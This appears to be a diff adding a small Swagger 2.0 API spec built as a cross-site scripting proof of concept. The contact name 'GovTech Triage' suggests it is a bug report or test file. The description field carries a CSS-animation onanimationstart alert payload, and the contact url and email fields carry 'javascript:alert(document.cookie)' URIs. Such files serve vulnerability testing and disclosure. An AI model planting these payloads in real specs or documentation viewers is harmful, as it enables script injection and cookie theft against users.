@@ -1,0 +1,15 @@
+swagger: '2.0'
+info:
+  version: "0.0.1"
+  title: Example Title
+  description: <style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)"></b>
+  contact: 
+   name: "GovTech Triage"
+   url: " javascript:alert(document.cookie)"
+   email: " javascript:alert(document.cookie)"
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
